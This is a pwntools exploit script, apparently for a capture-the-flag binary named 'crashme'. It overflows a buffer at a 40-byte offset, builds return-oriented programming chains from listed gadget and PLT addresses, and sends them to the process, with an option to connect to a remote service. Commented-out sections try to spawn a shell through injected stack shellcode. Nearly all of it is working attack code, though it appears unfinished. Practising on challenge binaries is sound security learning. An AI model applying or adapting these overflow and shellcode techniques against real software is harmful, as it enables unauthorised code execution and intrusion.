from pwn import *

exe = ELF('./crashme')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+107
        continue
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

rop = ROP(exe)
offset = 40

ret = 0x0000000000400501
# pop_rdi_ret = 0x0000000000400753
pop_rsi_pop_r15_ret = 0x0000000000400751
fgets = 0x400550

# 0x00000000004004e8  _init
# 0x0000000000400520  puts@plt
# 0x0000000000400530  printf@plt
# 0x0000000000400540  __libc_start_main@plt
# 0x0000000000400550  fgets@plt
# 0x0000000000400560  fflush@plt
# 0x0000000000400570  __gmon_start__@plt
# 0x0000000000400580  _start
# 0x00000000004005b0  deregister_tm_clones
# 0x00000000004005f0  register_tm_clones
# 0x0000000000400630  __do_global_dtors_aux
# 0x0000000000400650  frame_dummy
# 0x0000000000400676  main
# 0x00000000004006f0  __libc_csu_init
# 0x0000000000400760  __libc_csu_fini
# 0x0000000000400764  _fini

rop.raw(b"a" * offset)
# rop.register_tm_clones()
# rop.deregister_tm_clones()
# rop.frame_dummy()
# rop.fgets()
# rop.raw(pop_rsi_pop_r15_ret)
# rop.raw(pack(0xff))
# rop.raw(pack(0xff))
# rop.raw(pack(fgets))
# rop.main()
# rop.raw(pack(pop_rdi_ret))
# rop.raw(b'hogehoge')
# rop.printf()
rop.raw(ret)
rop.main()
io.sendlineafter(b': ', rop.chain())

rop.raw(ret)
rop.main()
io.sendlineafter(b': ', rop.chain())



# shellcode = asm(shellcraft.sh())
# head = shellcode[:offset]
# stack_addr = 0x7ffd78767ca0
# skip = asm('jmp $+0x8')
# tail = shellcode[offset:]
# print(head)
# print(skip)
# print(tail)

# rop.raw(head)
# rop.raw(pack(stack_addr))
# rop.raw(skip)
# rop.raw(tail)
# io.sendlineafter(b': ', rop.chain())

io.sendlineafter(b':', b'aaa')

io.interactive()